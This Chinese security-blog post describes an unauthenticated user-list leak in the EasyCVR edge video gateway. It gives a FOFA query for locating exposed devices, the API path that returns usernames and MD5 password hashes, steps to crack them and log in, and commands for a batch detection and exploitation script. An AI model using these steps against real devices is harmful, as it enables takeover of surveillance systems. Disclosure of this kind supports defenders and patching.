#  EasyCVR智能边缘网关未授权访问用户信息泄露漏洞   
原创 安全透视镜  网络安全透视镜   2023-10-10 07:00  
  
# 免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
****  
![](https://mmbiz.qpic.cn/mmbiz_jpg/apNprpz3YS4ibIBPcmgJMLNXWIaCPcW54T0nMWm7DFVY0XvNKB92Fz41xWKqTr2icv3Nem53Q5sJml7YG6fGPBeg/640?wx_fmt=jpeg "")  
  
# 一、漏洞描述  
  
****  
EasyCVR智能边缘网关是TSINGSEE青犀视频旗下一款软硬一体的产品，可提供多协议的设备接入、采集、AI智能检测、处理、分发等服务。通过对视频监控场景中的人、车、物等进行AI检测与抓拍，对异常情况进行智能提醒和通知，可广泛应用于安防监控、智能检测、通行核验等场景。  
  
EasyCVR智能边缘网关存在userlist 信息泄漏，攻击者可以直接登录后台，进行非法操作。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/apNprpz3YS5ScqVTPjicm4OgBhXgLfPH5xKANzKaMvRlyyiaMprzebuljp9t1lZLGfTg3blKSKerm67FsUCtNv5w/640?wx_fmt=png "")  
  
# 二、网络空间搜索引擎查询  
  
  
fofa查询  
```
title="EasyCVR"
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/apNprpz3YS5ScqVTPjicm4OgBhXgLfPH5nygHXPdap64lpNNX2MKTiaOd8EYX58y9kjSl7azDvMg59icUibsc3JKSg/640?wx_fmt=png "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/apNprpz3YS5ScqVTPjicm4OgBhXgLfPH5IZQicoCpcVfnyk25ZtXf6PejGPiaw6cz4BOXJckLIWhonmCA0MFuYslQ/640?wx_fmt=png "")  
  
# 三、漏洞复现  
  
  
poc  
  
![](https://mmbiz.qpic.cn/mmbiz_png/apNprpz3YS5ScqVTPjicm4OgBhXgLfPH5iaIh3Plenp1icYib5rpHm1EBQznG7EgzTGDMdoRsYeax2LCapJPjxNBdQ/640?wx_fmt=png "")  
  
或浏览器直接访问路径 /api/v1/userlist?pageindex=0&pagesize=10  
  
![](https://mmbiz.qpic.cn/mmbiz_png/apNprpz3YS5ScqVTPjicm4OgBhXgLfPH52cibvV8shNz9pz2dmaN0Hl3libYI91q5qCQYc2E5xp5BOzUxn0pD4w1A/640?wx_fmt=png "")  
  
然后将md5加密后的密码解密  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/apNprpz3YS5ScqVTPjicm4OgBhXgLfPH5gUkDCeFQlVDBEAqIPQibcjMQWcabFBqkPHVxYeZUfice6YXwBDn8wZrg/640?wx_fmt=png "")  
  
然后使用上面的Name 值作为用户名登录  
  
![](https://mmbiz.qpic.cn/mmbiz_png/apNprpz3YS5ScqVTPjicm4OgBhXgLfPH5Gk2moeDZcQQWdnicibRlQ2hl3VticykaXNIkj1qeydGL7wqCWKjI5C7kw/640?wx_fmt=png "")  
  
# 四、批量检测与利用  
  
  
单个检测  
```
python .\EasyCVR.py -u ip:port
```  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/apNprpz3YS5ScqVTPjicm4OgBhXgLfPH5MGic2Uv1l5dnmzbiayXQicBFPzgpKGFU4VmFrt7H7ic414K4K2IyJuOGUw/640?wx_fmt=png "")  
  
  
批量检测  
```
python .\EasyCVR.py -f  filename
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/apNprpz3YS5ScqVTPjicm4OgBhXgLfPH5IrKwqyJXZ1iaDtNhhQULoiaIy12q6DNem7ZpgU846dULvzcq1yiaAPpiaQ/640?wx_fmt=png "")  
  
  
**关注微信公众号 网络安全透视镜 回复 20231010 获取批量检测利用脚本**  
  
# 免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
****  
![](https://mmbiz.qpic.cn/mmbiz_png/apNprpz3YS4ibIBPcmgJMLNXWIaCPcW54mVicYJkaOO1JQicEDBGCBM1P7IiaiablZ9tEUrP27FyvB9CZWl5SiaqhicDw/640?wx_fmt=png "")  
  
  
